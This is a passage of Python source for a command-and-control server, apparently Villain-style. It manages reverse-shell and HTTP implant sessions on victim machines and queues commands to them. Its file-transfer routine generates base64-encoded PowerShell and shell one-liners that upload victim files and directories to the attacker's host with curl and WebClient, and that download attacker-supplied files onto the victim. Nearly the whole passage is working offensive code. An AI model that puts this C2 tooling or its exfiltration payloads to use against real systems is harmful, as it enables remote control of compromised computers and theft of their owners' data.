                                elif char == 3: # Ctrl-C
                                    os.write(sys.stdout.fileno(), b"^C\r\n")
                                    is_intercepting = False
                                    at_start_of_line = True
                                    c2_cmd_buffer = b""
                                else:
                                    c2_cmd_buffer += char_b
                                    os.write(sys.stdout.fileno(), char_b)
                    except Exception as e:
                        print(f"\r\n[!] Input error: {e}")
                        return
    finally:
        signal.signal(signal.SIGWINCH, original_sigwinch)
        interactive_shell_active_for_id = None
        if old_settings is not None:
            try:
                # Use TCSADRAIN to ensure all output is sent before restoring
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            except Exception:
                pass
        with global_lock:
            if current_session == ('shell', shell_id):
                current_session = None
        sys.stdout.write("\r\nC2 > ")
        sys.stdout.flush()

def enter_shell_session(shell_id: str):
    """Wrapper to enter shell session.

    Always uses line-mode to ensure stable interaction with bash/sh.
    """
    global current_session, line_mode_shell_id
    with global_lock:
        if shell_id not in shell_sessions:
            print("[!] Shell is no longer active.")
            return
        current_session = ('shell', shell_id)
        line_mode_shell_id = shell_id
    print(f"[+] Interacting with shell {shell_id} in line mode. Type commands and press Enter. Press Ctrl-C to return to C2 console.")
    # Try to request a prompt immediately in line mode
    try:
        shell_sessions[shell_id]['socket'].sendall(b'printf "%s" "${PS1:-$ }"\n')
    except Exception:
        pass

# ==================== VILLAIN-STYLE SESSION MANAGEMENT ====================

def calculate_session_stability(session_data):
    """Calculate session stability score (0.0 to 1.0) based on multiple factors"""
    if not session_data:
        return 0.0
    
    current_time = time.time()
    last_seen = session_data.get("last_seen", 0)
    last_activity = session_data.get("last_activity", last_seen)
    consecutive_failures = session_data.get("consecutive_failures", 0)
    successful_commands = session_data.get("successful_commands", 0)
    total_commands = session_data.get("total_commands", 1)
    
    # Base score from command success rate
    success_rate = successful_commands / max(total_commands, 1)
    
    # Time-based factors
    time_since_activity = current_time - last_activity
    time_since_seen = current_time - last_seen
    
    # Recent activity bonus
    recent_activity_bonus = 0.0
    if time_since_activity < 30:  # Active in last 30 seconds
        recent_activity_bonus = 0.3
    elif time_since_activity < 120:  # Active in last 2 minutes
        recent_activity_bonus = 0.1
    
    # Failure penalty
    failure_penalty = min(consecutive_failures * 0.1, 0.5)
    
    # Calculate final stability score
    stability = max(0.0, min(1.0, success_rate + recent_activity_bonus - failure_penalty))
    
    return stability

def calculate_dynamic_timeout(session_data):
    """Calculate dynamic timeout based on session stability and state"""
    if not session_data:
        return BASE_TIMEOUT
    
    stability = calculate_session_stability(session_data)
    session_state = session_data.get("state", "idle")
    
    # Base timeout based on stability
    if stability < STABILITY_THRESHOLD_LOW:
        base_timeout = UNSTABLE_TIMEOUT
    elif stability > STABILITY_THRESHOLD_HIGH:
        base_timeout = STABLE_TIMEOUT
    else:
        base_timeout = BASE_TIMEOUT
    
    # Adjust based on session state
    if session_state == "file_transfer":
        # For file transfers, use extended timeout regardless of stability
        return FILE_TRANSFER_TIMEOUT
    elif session_state == "busy":
        # For busy sessions, use longer timeout for stable sessions
        if stability > STABILITY_THRESHOLD_HIGH:
            return max(BUSY_TIMEOUT, base_timeout * 2)
        else:
            return BUSY_TIMEOUT
    elif session_state == "error":
        return UNSTABLE_TIMEOUT
    
    return base_timeout

def update_session_stability(session_id, success=True):
    """Update session stability metrics after command execution"""
    if session_id not in http_sessions:
        return
    
    session = http_sessions[session_id]
    
    # Update command counters
    session["total_commands"] = session.get("total_commands", 0) + 1
    if success:
        session["successful_commands"] = session.get("successful_commands", 0) + 1
        session["consecutive_failures"] = 0
    else:
        session["consecutive_failures"] = session.get("consecutive_failures", 0) + 1
    
    # Update stability score
    session["stability_score"] = calculate_session_stability(session)
    
    # Update session status based on stability
    stability = session["stability_score"]
    if stability < STABILITY_THRESHOLD_LOW:
        session["status"] = "unstable"
    elif stability > STABILITY_THRESHOLD_HIGH:
        session["status"] = "stable"
    else:
        session["status"] = "moderate"

def queue_command(session_id, command, command_type="shell"):
    """Queue a command for execution when session is stable"""
    if session_id not in http_sessions:
        return False
    
    session = http_sessions[session_id]
    
    if "command_queue" not in session:
        session["command_queue"] = []
    
    command_entry = {
        "command": command,
        "timestamp": time.time(),
        "retries": 0,
        "type": command_type,
        "max_retries": 3
    }
    
    session["command_queue"].append(command_entry)
    return True

def process_command_queue(session_id):
    """Process queued commands for a session"""
    if session_id not in http_sessions:
        return
    
    session = http_sessions[session_id]
    command_queue = session.get("command_queue", [])
    
    if not command_queue:
        return
    
    current_time = time.time()
    stability = calculate_session_stability(session)
    
    # Only process commands if session is stable enough
    if stability < STABILITY_THRESHOLD_LOW:
        return
    
    # Process commands that are ready
    commands_to_remove = []
    for i, cmd_entry in enumerate(command_queue):
        # Don't retry too frequently
        if current_time - cmd_entry["timestamp"] < 30:
            continue
        
        # Execute the command
        try:
            if cmd_entry["type"] == "shell":
                # Execute shell command
                session["last_cmd"] = cmd_entry["command"]
                session["awaiting"] = True
                session["state"] = "busy"
                session["command_sent_time"] = current_time
                commands_to_remove.append(i)
                update_session_stability(session_id, True)
            elif cmd_entry["type"] == "file_transfer":
                # Handle file transfer
                session["state"] = "file_transfer"
                session["command_sent_time"] = current_time
                commands_to_remove.append(i)
                update_session_stability(session_id, True)
        except Exception as e:
            cmd_entry["retries"] += 1
            if cmd_entry["retries"] >= cmd_entry["max_retries"]:
                commands_to_remove.append(i)
                update_session_stability(session_id, False)
    
    # Remove processed commands
    for i in reversed(commands_to_remove):
        command_queue.pop(i)

def repair_session(session_id, repair_type, value):
    """Repair session metadata"""
    session = None
    session_type = None
    
    # Check both HTTP and Shell sessions
    if session_id in http_sessions:
        session = http_sessions[session_id]
        session_type = "http"
    elif session_id in shell_sessions:
        session = shell_sessions[session_id]
        session_type = "shell"
    else:
        return False
    
    # Apply repair based on type
    if repair_type == "hostname":
        session["hostname"] = value
    elif repair_type == "username":
        session["username"] = value
    elif repair_type == "cwd":
        session["cwd"] = value
    elif repair_type == "os":
        session["os"] = value
    else:
        return False
    
    # Reset stability for HTTP sessions (shell sessions don't have stability tracking)
    if session_type == "http":
        session["consecutive_failures"] = 0
        session["stability_score"] = calculate_session_stability(session)
    
    return True

def get_session_status(session_id):
    """Get detailed session status information"""
    session = None
    session_type = None
    
    # Check both HTTP and Shell sessions
    if session_id in http_sessions:
        session = http_sessions[session_id]
        session_type = "http"
    elif session_id in shell_sessions:
        session = shell_sessions[session_id]
        session_type = "shell"
    else:
        return None
    
    # Calculate stability (HTTP sessions have stability tracking, Shell sessions are always stable)
    if session_type == "http":
        stability = calculate_session_stability(session)
    else:
        stability = 1.0  # Shell sessions are always considered stable
    
    # Get session data with appropriate defaults
    if session_type == "http":
        return {
            "id": session_id,
            "type": "HTTP",
            "status": session.get("status", "unknown"),
            "stability": stability,
            "state": session.get("state", "idle"),
            "last_seen": session.get("last_seen", 0),
            "last_activity": session.get("last_activity", 0),
            "successful_commands": session.get("successful_commands", 0),
            "total_commands": session.get("total_commands", 0),
            "consecutive_failures": session.get("consecutive_failures", 0),
            "queued_commands": len(session.get("command_queue", [])),
            "timeout": calculate_dynamic_timeout(session)
        }
    else:  # shell session
        return {
            "id": session_id,
            "type": "SHELL",
            "status": "stable",
            "stability": stability,
            "state": "idle",
            "last_seen": time.time(),  # Shell sessions are always "current"
            "last_activity": time.time(),
            "successful_commands": 0,  # Shell sessions don't track this
            "total_commands": 0,
            "consecutive_failures": 0,
            "queued_commands": 0,  # Shell sessions don't have command queues
            "timeout": 60  # Default timeout for shell sessions
        }

# ==================== END VILLAIN-STYLE SESSION MANAGEMENT ====================

def wait_for_http_response(uid: str, timeout_seconds: int = None):
    """Wait for an HTTP implant response with dynamic timeout.

    Handles session disconnections and reconnections during file transfers.
    Returns when response arrives or timeout occurs.
    """
    # Use dynamic timeout if not specified
    if timeout_seconds is None:
        if uid in http_sessions:
            timeout_seconds = calculate_dynamic_timeout(http_sessions[uid])
        else:
            timeout_seconds = BASE_TIMEOUT
    
    start_time = time.time()
    session_disconnected = False

    while True:
        current_time = time.time()
        
        with global_lock:
            session = http_sessions.get(uid)
            has = bool(session and session.get("has_new_output"))
            output = session.get("output") if session else ""
            
            # Check if session was disconnected and reconnected
            if not session and not session_disconnected:
                session_disconnected = True
                print(f"\n[!] Session {uid} disconnected during transfer, waiting for reconnection...")
            elif session and session_disconnected:
                session_disconnected = False
                print(f"\n[+] Session {uid} reconnected, continuing transfer...")
        
        if has:
            break
            
        elapsed = current_time - start_time
        
        if session and session.get("state") == "file_transfer":
            effective_timeout = FILE_TRANSFER_TIMEOUT
        else:
            effective_timeout = timeout_seconds

        # Extend further if we had a disconnect/reconnect event
        if session_disconnected:
            effective_timeout += 60
            
        # Check for timeout
        if elapsed > effective_timeout:
            print(f"\n[!] Timeout waiting for response from session {uid} ({int(elapsed)}s)")
            break
            
        time.sleep(0.1)

    # Print the captured output after bar completes (strip control markers)
    lines = (output or "").splitlines()
    cleaned_lines = [ln for ln in lines if not (ln.strip().startswith("CWD:") or ln.strip() == "CDERR")]
    clean_display = "\n".join(cleaned_lines).strip()
    if clean_display and clean_display != "OK":
        # Always display normal HTTP output, but filter out debug messages
        if not GLOBAL_VERBOSE and FILE_TRANSFER_IN_PROGRESS:
            # In quiet mode during file transfer, suppress all HTTP output
            pass
        elif not GLOBAL_VERBOSE:
            # In quiet mode, filter out debug messages
            lines = clean_display.split('\n')
            filtered_lines = []
            for line in lines:
                # Keep normal HTTP output, filter debug messages
                if not (line.strip().startswith('[DEBUG]') or 
                       line.strip().startswith('[*]') or
                       line.strip().startswith('[+]') and 'Detected' in line or
                       line.strip().startswith('[+]') and 'Command:' in line or
                       line.strip().startswith('[+]') and 'Will save to:' in line):
                    filtered_lines.append(line)
            clean_display = '\n'.join(filtered_lines)
            if clean_display and clean_display != "OK":
                sys.stdout.write(clean_display + "\n")
        else:
            # In verbose mode, display everything
            if clean_display and clean_display != "OK":
                sys.stdout.write(clean_display + "\n")
    # Reset flags and repaint prompt
    with global_lock:
        if uid in http_sessions:
            http_sessions[uid]["has_new_output"] = False
            http_sessions[uid]["awaiting"] = False
    sys.stdout.write("C2 > ")
    sys.stdout.flush()


def generate_file_transfer_commands(transfer_type: str, os_choice: str, file_path: str, filename: str = None, is_directory: bool = False) -> str:
    """Generate file transfer commands for Windows/Linux"""
    # URL-encode filename for HTTP path safety (Unicode, spaces, etc.)
    safe_name = quote(filename or "")
    
    if transfer_type == "receive":  # Victim sends file to attacker
        if is_directory:
            # For directories, compress them first
            if os_choice == "Windows":
                # Use the most reliable method - tar command (works on Windows 10+)
                ps_script = f"""
$dir = '{file_path}'
$tarPath = '{file_path}.tar.gz'
$url = 'http://{HOST}:{FILE_UPLOAD_PORT}/?filename={safe_name}&type=tar.gz'

Write-Output "Starting directory transfer using tar..."
Write-Output "Directory: $dir"
Write-Output "Tar path: $tarPath"

try {{
    # Remove old tar if exists
    if (Test-Path $tarPath) {{ 
        Write-Output "Removing old tar file..."
        Remove-Item $tarPath -Force 
    }}
    
    # Verify directory exists
    if (-not (Test-Path $dir -PathType Container)) {{
        throw "Directory does not exist: $dir"
    }}
    
    Write-Output "Creating tar.gz archive..."
    
    # List directory contents before compression
    Write-Output "Directory contents before compression:"
    $items = Get-ChildItem $dir -Recurse
    foreach ($item in $items) {{
        $relativePath = $item.FullName.Substring($dir.Length + 1)
        Write-Output "  - $relativePath ($(if ($item.PSIsContainer) {{'dir'}} else {{'file'}}))"
    }}
    Write-Output "Total items: $($items.Count)"
    
    # Use tar command (available in Windows 10+) - most reliable method
    $parentDir = Split-Path $dir -Parent
    $dirName = Split-Path $dir -Leaf
    
    Write-Output "Parent directory: $parentDir"
    Write-Output "Directory name: $dirName"
    Write-Output "Tar path: $tarPath"
    
    # Change to parent directory and create tar.gz
    Push-Location $parentDir
    try {{
        Write-Output "Current directory: $(Get-Location)"
        Write-Output "Running: tar -czf '$tarPath' '$dirName'"
        tar -czf $tarPath $dirName
        Write-Output "Tar command exit code: $LASTEXITCODE"
        if ($LASTEXITCODE -ne 0) {{
            throw "tar command failed with exit code: $LASTEXITCODE"
        }}
    }} finally {{
        Pop-Location
    }}
    
    # Verify tar was created
    if (-not (Test-Path $tarPath)) {{
        throw "TAR file was not created at: $tarPath"
    }}
    
    $tarSize = (Get-Item $tarPath).Length
    Write-Output "TAR created successfully. Size: $tarSize bytes"
    
    # Upload the tar file
    Write-Output "Uploading file..."
    $fileBytes = [System.IO.File]::ReadAllBytes($tarPath)
    $webClient = New-Object System.Net.WebClient
    $webClient.UploadData($url, 'POST', $fileBytes)
    
    Write-Output "Upload completed successfully"
    
    # Clean up
    Remove-Item $tarPath -Force -ErrorAction SilentlyContinue
    Write-Output "Directory transfer completed successfully"
    
}} catch {{
    Write-Output "Error: $($_.Exception.Message)"
    Write-Output "Full error: $($_.Exception.ToString())"
}}
"""
                ps_bytes = ps_script.encode('utf-16le')
                b64 = base64.b64encode(ps_bytes).decode('ascii')
                return f"powershell -NoProfile -NonInteractive -EncodedCommand {b64}"
            else:  # Linux - use tar to create compressed archive
                cmd = f"tar -czf '{file_path}.tar.gz' -C '{os.path.dirname(file_path)}' '{os.path.basename(file_path)}' && curl -s -X POST --data-binary @'{file_path}.tar.gz' 'http://{HOST}:{FILE_UPLOAD_PORT}/?filename={safe_name}&type=tar.gz' && rm '{file_path}.tar.gz'"
                b64 = base64.b64encode(cmd.encode('utf-8')).decode('ascii')
                return f"sh -c \"$(echo '{b64}' | base64 -d)\""
        else:
            # Regular file transfer
            if os_choice == "Windows":
                # Use streaming approach instead of -InFile to enable real-time progress
                ps_script = f"""
$filePath = '{file_path}'
$url = 'http://{HOST}:{FILE_UPLOAD_PORT}/?filename={safe_name}'
$ProgressPreference = 'Continue'

try {{
    # Get file size for progress tracking
    $fileSize = (Get-Item $filePath).Length
    Write-Output "Starting file upload: $filePath ($fileSize bytes)"
    
    # Read file in chunks and upload with progress
    $fileStream = [System.IO.File]::OpenRead($filePath)
     $buffer = New-Object byte[] 16384
    $totalRead = 0
    
    # Create HTTP request manually for streaming
    $request = [System.Net.WebRequest]::Create($url)
    $request.Method = "POST"
    $request.ContentLength = $fileSize
    $request.ContentType = "application/octet-stream"
    
    $requestStream = $request.GetRequestStream()
    
    while (($bytesRead = $fileStream.Read($buffer, 0, $buffer.Length)) -gt 0) {{
        $requestStream.Write($buffer, 0, $bytesRead)
        $totalRead += $bytesRead
        
         # Show progress every 128KB for better performance
         if ($totalRead % 131072 -eq 0 -or $totalRead -eq $fileSize) {{
            $percent = [math]::Round(($totalRead / $fileSize) * 100, 1)
            Write-Progress -Activity "Uploading file" -Status "$percent% Complete" -PercentComplete $percent
        }}
    }}
    
    $requestStream.Close()
    $fileStream.Close()
    
    # Get response
    $response = $request.GetResponse()
    $response.Close()
    
    Write-Output "File uploaded successfully"
    
}} catch {{
    Write-Output "Error: $($_.Exception.Message)"
}} finally {{
    if ($fileStream) {{ $fileStream.Close() }}
    if ($requestStream) {{ $requestStream.Close() }}
}}
"""
                ps_bytes = ps_script.encode('utf-16le')
                b64 = base64.b64encode(ps_bytes).decode('ascii')
                return f"powershell -NoProfile -NonInteractive -EncodedCommand {b64}"
            else:  # Linux (encode command and decode on victim)
                cmd = f"curl -s -X POST --data-binary @\"{file_path}\" \"http://{HOST}:{FILE_UPLOAD_PORT}/?filename={safe_name}\""
                b64 = base64.b64encode(cmd.encode('utf-8')).decode('ascii')
                return f"sh -c \"$(echo '{b64}' | base64 -d)\""
    else:  # transfer_type == "send" - Attacker sends file to victim
        if is_directory:
            # For directories, download and extract the compressed archive
            if os_choice == "Windows":
                ps_script = f"""
$url = 'http://{HOST}:{FILE_DOWNLOAD_PORT}/{safe_name}'
$archivePath = '{file_path}'
$extractDir = '{file_path[:-7]}'  # Remove .tar.gz extension

Write-Output "Downloading directory archive..."
try {{
    # Use Invoke-WebRequest with progress tracking
    $ProgressPreference = 'Continue'
    Invoke-WebRequest -Uri $url -OutFile $archivePath -ErrorAction Stop
    Write-Output "Archive downloaded successfully to: $archivePath"
    
    # Extract the tar.gz file to preserve folder structure
    Write-Output "Extracting directory..."
    $parentDir = Split-Path $extractDir -Parent
    $dirName = Split-Path $extractDir -Leaf
    
    # Extract directly to parent directory to preserve the original folder structure
    Push-Location $parentDir
    try {{
        tar -xzf $archivePath
        Write-Output "Directory extracted successfully to: $parentDir"
    }} finally {{
        Pop-Location
    }}
    
    # Clean up the archive file
    Remove-Item $archivePath -Force -ErrorAction SilentlyContinue
    Write-Output "Directory transfer completed successfully"
    
}} catch {{
    Write-Output "Error: $($_.Exception.Message)"
    Write-Output "Full error: $($_.Exception.ToString())"
}}
"""
                ps_bytes = ps_script.encode('utf-16le')
                b64 = base64.b64encode(ps_bytes).decode('ascii')
                return f"powershell -NoProfile -NonInteractive -EncodedCommand {b64}"
            else:  # Linux
                cmd = f"""echo "Downloading directory archive..."
curl -s -o '{file_path}' 'http://{HOST}:{FILE_DOWNLOAD_PORT}/{safe_name}' && \\
echo "Archive downloaded successfully" && \\
echo "Extracting directory..." && \\
tar -xzf '{file_path}' && \\
echo "Directory extracted successfully to: {os.path.dirname(file_path)}" && \\
rm '{file_path}' && \\
echo "Directory transfer completed successfully"
"""
                b64 = base64.b64encode(cmd.encode('utf-8')).decode('ascii')
                return f"sh -c \"$(echo '{b64}' | base64 -d)\""
        else:
            # Regular file transfer
            if os_choice == "Windows":
                ps = (
                    f"$u='http://{HOST}:{FILE_DOWNLOAD_PORT}/{safe_name}';"
                    f"$ProgressPreference='Continue';"
                    f"Invoke-WebRequest -Uri $u -OutFile '{file_path}'"
                )
                ps_bytes = ps.encode('utf-16le')
                b64 = base64.b64encode(ps_bytes).decode('ascii')
                return f"powershell -NoProfile -NonInteractive -EncodedCommand {b64}"
            else:  # Linux (encode command and decode on victim)
                cmd = f"curl -s -o \"{file_path}\" http://{HOST}:{FILE_DOWNLOAD_PORT}/{safe_name}"
                b64 = base64.b64encode(cmd.encode('utf-8')).decode('ascii')
                return f"sh -c \"$(echo '{b64}' | base64 -d)\""


def cleanup_orphaned_download_mappings():
    """Clean up orphaned download mappings and temp files"""
    with global_lock:
        tokens_to_remove = []
        for token, file_path in download_mappings.items():
            try:
                if not os.path.exists(file_path):
                    # File doesn't exist anymore, remove mapping
                    tokens_to_remove.append(token)
                    continue
                
                # Check if it's a UUID temp file that's old enough to be orphaned
                filename = os.path.basename(file_path)
                if filename.endswith('.tar.gz') and len(filename) == 40:  # UUID + .tar.gz
                    uuid_part = filename[:-7]  # Remove .tar.gz
                    if len(uuid_part) == 32 and all(c in '0123456789abcdef' for c in uuid_part):
                        # This is a UUID temp file - check if it's old enough to be orphaned
                        file_age = time.time() - os.path.getmtime(file_path)
                        if file_age > 600:  # 10 minutes old - definitely orphaned
                            tokens_to_remove.append(token)
                            try:
                                os.remove(file_path)
                                quiet_print(f"[+] Cleaned up orphaned temp file: {filename}")
                            except Exception as e:
                                quiet_print(f"[!] Failed to remove orphaned temp file {filename}: {e}")
            except Exception:
                # If we can't check the file, remove the mapping to be safe
                tokens_to_remove.append(token)
        
        # Remove the tokens from download mappings
        for token in tokens_to_remove:
            if token in download_mappings:
                del download_mappings[token]
        
        if tokens_to_remove:
            quiet_print(f"[+] Cleaned up {len(tokens_to_remove)} orphaned download mapping(s)")

def cleanup_temp_files():
    """Clean up temporary UUID files in /tmp directory"""
    temp_dir = "/tmp"
    if not os.path.exists(temp_dir):
        print("[!] /tmp directory not found.")
        return
    
    cleaned_count = 0
    try:
        for filename in os.listdir(temp_dir):
            # Check if it's a UUID-named tar.gz file (32 hex characters + .tar.gz)
            if filename.endswith('.tar.gz') and len(filename) == 40:  # 32 hex + .tar.gz
                # Verify it's a valid UUID format (32 hex characters)
                uuid_part = filename[:-7]  # Remove .tar.gz
                if len(uuid_part) == 32 and all(c in '0123456789abcdef' for c in uuid_part):
                    file_path = os.path.join(temp_dir, filename)
                    try:
                        os.remove(file_path)
                        print(f"[+] Cleaned up: {filename}")
                        cleaned_count += 1
                    except Exception as e:
                        print(f"[!] Failed to remove {filename}: {e}")
        
        if cleaned_count == 0:
            print("[*] No temporary files found to clean up.")
        else:
            print(f"[+] Cleaned up {cleaned_count} temporary file(s).")
            
    except Exception as e:
        print(f"[!] Error during cleanup: {e}")

def handle_file_send_cli(file_path, verbose=False):
    """Handle file send command in CLI mode - no interactive prompts"""
    set_global_verbose(verbose)
    set_file_transfer_mode(True)
    if not current_session:
        print("[!] No session selected. Use 'list' and 'select <ID>' first.")
        return
    
    # FIRST: Check if the source file/folder exists on attacker's machine
    quiet_print(f"[*] Verifying source file/folder exists: {file_path}")
    exists, is_directory, error_msg = check_local_file_exists(file_path)
    
    if not exists:
        print(f"[!] {error_msg}")
        print("[!] File transfer cancelled.")
        # Reset file transfer mode before returning
        set_file_transfer_mode(False)
        return
    
    # Show what type of item we found
    if is_directory:
        quiet_print(f"[+] Source directory found: {file_path}")
    else:
        quiet_print(f"[+] Source file found: {file_path}")
    
    # Calculate file size for progress tracking
    file_size = calculate_file_size(file_path)
    filename = os.path.basename(file_path)
    
    # Initialize progress tracking
    if file_size > 0:
        progress = FileTransferProgress(file_size, filename, "send")
        set_progress_tracker(progress)
        # Display file size in appropriate unit (bytes, KB, or MB)
        if file_size < 1024:  # Less than 1KB
            size_display = f"{file_size}B"
        elif file_size < (1024 * 1024):  # Less than 1MB
            size_display = f"{file_size / 1024:.1f}KB"
        else:
            size_display = f"{file_size / (1024*1024):.1f}MB"
        quiet_print(f"[*] File size: {size_display}", always_show=True)
    else:
        quiet_print(f"[*] File size: Unknown", always_show=True)
    
    session_type, session_id = current_session
    
    if session_type == 'http':
        with global_lock:
            if session_id not in http_sessions:
                print("[!] HTTP session not found.")
                return
            session = http_sessions[session_id]
            cwd = session.get('cwd')
            if not cwd:
                # Auto-detect CWD on victim by sending an explicit CWD marker command
                # Try Windows-style first; if session OS is known, prefer it
                sess_os = session.get('os')
                if sess_os == 'Windows':
                    discover_cmd = "powershell -c \"Write-Output 'CWD:' + (Get-Location).Path\""
                elif sess_os == 'Linux':
                    discover_cmd = "pwd | sed 's/^/CWD:/'"
                else:
                    # Unknown: try Windows marker first to avoid sed error in PS, then fallback
                    discover_cmd = "powershell -c \"Write-Output 'CWD:' + (Get-Location).Path\""
                http_sessions[session_id]['last_cmd'] = discover_cmd
                http_sessions[session_id]['has_new_output'] = False
                http_sessions[session_id]['awaiting'] = True
        if session_type == 'http' and not cwd:
            quiet_print("[*] Detecting victim current directory...")
            wait_for_http_response(session_id, 8)
            with global_lock:
                if session_id in http_sessions:
                    cwd = http_sessions[session_id].get('cwd')
        if session_type == 'http' and not cwd:
            # Fallback: send plain OS-specific command to trigger heuristic parser
            session = http_sessions.get(session_id, {})
            sess_os = session.get('os')
            if sess_os == 'Windows':
                fallback_cmd = "Get-Location"
            elif sess_os == 'Linux':
                fallback_cmd = "pwd"
            else:
                # Unknown: try Windows first, then we'll try POSIX if still unknown
                fallback_cmd = "Get-Location"
            with global_lock:
                if session_id in http_sessions:
                    http_sessions[session_id]['last_cmd'] = fallback_cmd
                    http_sessions[session_id]['has_new_output'] = False
                    http_sessions[session_id]['awaiting'] = True
            wait_for_http_response(session_id, 5)
            with global_lock:
                if session_id in http_sessions:
                    cwd = http_sessions[session_id].get('cwd')
        if session_type == 'http' and not cwd:
            # Final fallback: try POSIX
            with global_lock:
                if session_id in http_sessions:
                    http_sessions[session_id]['last_cmd'] = "pwd"
                    http_sessions[session_id]['has_new_output'] = False
                    http_sessions[session_id]['awaiting'] = True
            wait_for_http_response(session_id, 5)
            with global_lock:
                if session_id in http_sessions:
                    cwd = http_sessions[session_id].get('cwd')
        if session_type == 'http' and cwd:
            # Lock in OS after discovery
            with global_lock:
                if session_id in http_sessions and not http_sessions[session_id].get('os'):
                    if re.match(r'^[A-Za-z]:[\\/]', cwd) or ('\\' in cwd and not cwd.startswith('/')):
                        http_sessions[session_id]['os'] = 'Windows'
                    elif cwd.startswith('/'):
                        http_sessions[session_id]['os'] = 'Linux'
        if session_type == 'http' and not cwd:
            print("[!] Could not determine victim current directory automatically.")
            return
    elif session_type == 'shell':
        with global_lock:
            if session_id not in shell_sessions:
                print("[!] Shell session not found.")
                return
            sess_os = shell_sessions[session_id].get('os')

        # Always resync CWD at the start of transfer for TCP shells
        quiet_print("[*] Detecting victim OS and current directory...")
        
        # Determine detection command
        if sess_os == 'Windows':
            detect_cmd = (
                "powershell -NoProfile -NonInteractive -Command "
                "$ErrorActionPreference='SilentlyContinue';"
                "Write-Output ('CWD:' + (Get-Location).Path)"
            )
        else:
            detect_cmd = r'printf "CWD:%s\n" "$PWD" 2>/dev/null || echo "CWD:$(pwd)"'
            
        # Execute and parse
        output = shell_execute_and_get_output(session_id, detect_cmd, timeout=3)
        
        # Parse output for CWD
        new_cwd = None
        if 'CWD:' in output:
            try:
                # Get the last line that contains CWD:
                marker_lines = [ln for ln in output.splitlines() if 'CWD:' in ln]
                if marker_lines:
                    new_cwd = marker_lines[-1].split(':', 1)[1].strip()
            except Exception:
                pass
        
        if not new_cwd and output.strip():
            # Fallback: if output is a path-like string
            lines = [ln for ln in output.splitlines() if ln.strip()]
            if lines:
                cand = lines[-1].strip()
                cand = re.sub(r'^[\$#>\s]*', '', cand)
                if cand.startswith('/') or re.match(r'^[A-Za-z]:[\\/]', cand):
                    new_cwd = cand
        
        if new_cwd:
            cwd = new_cwd
            with global_lock:
                if session_id in shell_sessions:
                    shell_sessions[session_id]['cwd'] = cwd
            quiet_print(f"[*] Detected CWD: {cwd}")
        else:
            quiet_print("[!] Automatic CWD detection failed, using last known or fallback.")
            with global_lock:
                cwd = shell_sessions.get(session_id, {}).get('cwd')
            
            if not cwd:
                cwd = "/tmp"  # Generic fallback
                quiet_print(f"[*] Using fallback CWD: {cwd}")
    else:
        print("[!] Unknown session type.")
        return
    
    # Send logic from original handle_file_transfer function
    if verbose:
        quiet_print(f"\n[+] Sending file to victim...")
        quiet_print(f"[*] Victim's current directory: {cwd}")
    
    # Use provided file path instead of asking for input
    local_path = file_path.strip()
    if not local_path:
        print("[!] Path cannot be empty.")
        return
    
    # Expand user path and check if path exists
    local_path = os.path.expanduser(local_path)
    if not os.path.exists(local_path):
        print(f"[!] Path not found: {local_path}")
        return
    
    # Check if it's a directory
    is_directory = os.path.isdir(local_path)
    if is_directory:
        quiet_print(f"[+] Detected directory: {local_path}", always_show=True)
        # For directories, compress them first
        quiet_print(f"[+] Compressing directory for transfer...", always_show=True)
        import tempfile
        import tarfile
        
        # Create a temporary compressed file
        temp_dir = "/tmp"  # Use /tmp explicitly for temporary files
        # Handle paths that end with / by removing trailing slash first
        clean_path = local_path.rstrip('/\\')
        dir_name = os.path.basename(clean_path)
        if not dir_name:  # Fallback if basename is still empty
            dir_name = "directory"
        compressed_file = os.path.join(temp_dir, f"{dir_name}.tar.gz")
        
        try:
            # Create tar.gz archive
            with tarfile.open(compressed_file, 'w:gz') as tar:
                tar.add(local_path, arcname=dir_name)
            
            quiet_print(f"[+] Directory compressed to: {compressed_file}")
            local_file = compressed_file  # Use compressed file for transfer
            filename = f"{dir_name}.tar.gz"  # Update filename to include extension
        except Exception as e:
            print(f"[!] Failed to compress directory: {e}")
            return
    else:
        quiet_print(f"[+] Detected file: {local_path}", always_show=True)
        local_file = local_path
    
    # Determine victim filename and save path automatically (use victim CWD)
    filename = os.path.basename(local_file)
    victim_filename = filename
    victim_save = victim_filename
    
    # Build full path on victim in current working directory
    if cwd.endswith('/') or cwd.endswith('\\'):
        full_victim_path = cwd + victim_save
    else:
        sep = '\\' if ('\\' in cwd or re.match(r'^[A-Za-z]:', cwd)) else '/'
        full_victim_path = cwd + sep + victim_save
    
    # Create a one-time token mapping to the file path
    # The HTTP download handler will serve this exact file at /<token>
    token = uuid.uuid4().hex
    with global_lock:
        download_mappings[token] = local_file
    mapped_url_path = token
    
    # Generate and send command
    # Resolve effective OS similarly to receive path
    sess_os = None
    if session_type == 'http':
        with global_lock:
            sess = http_sessions.get(session_id, {})
            sess_os = sess.get('os')
    else:
        with global_lock:
            sess = shell_sessions.get(session_id, {})
            sess_os = sess.get('os')

    inferred_os = None
    try:
        if cwd:
            if re.match(r'^[A-Za-z]:[\\/]', cwd) or ('\\' in cwd and not cwd.startswith('/')):
                inferred_os = 'Windows'
            elif cwd.startswith('/'):
                inferred_os = 'Linux'
    except Exception:
        inferred_os = None

    effective_os = sess_os or inferred_os or 'Linux'
    # Use token path for download URL so we don't need to copy files locally
    cmd = generate_file_transfer_commands("send", effective_os, full_victim_path, mapped_url_path, is_directory)
    quiet_print(f"\n[+] Sending command to victim...", always_show=True)
    quiet_print(f"[*] Command: {cmd}")
    quiet_print(f"[*] Will save to: {full_victim_path}")
    quiet_print(f"[*] Serving local file via token: /{mapped_url_path}")
    
    if session_type == 'http':
        with global_lock:
            current_time = time.time()
            http_sessions[session_id]['last_cmd'] = cmd
            http_sessions[session_id]['command_sent_time'] = current_time
            http_sessions[session_id]['has_new_output'] = False
            http_sessions[session_id]['awaiting'] = True
            http_sessions[session_id]['state'] = "file_transfer"
            http_sessions[session_id]['last_activity'] = current_time
        
        # Start progress bar AFTER all verbose messages are displayed
        if file_size > 0:
            progress.display_progress(force_show=True)
        
        wait_for_http_response(session_id)  # Use dynamic timeout for file transfer
        
        # Clean up the temp file after transfer is complete
        if is_directory and 'compressed_file' in locals() and os.path.exists(compressed_file):
            try:
                os.remove(compressed_file)
                quiet_print(f"[+] Cleaned up temp file: {os.path.basename(compressed_file)}")
            except Exception as e:
                print(f"[!] Failed to clean up temp file: {e}")
        
        # Remove from download mappings
        with global_lock:
            if token in download_mappings:
                del download_mappings[token]
    else:  # shell session
        # For shell sessions, send the command directly
        with global_lock:
            if session_id in shell_sessions:
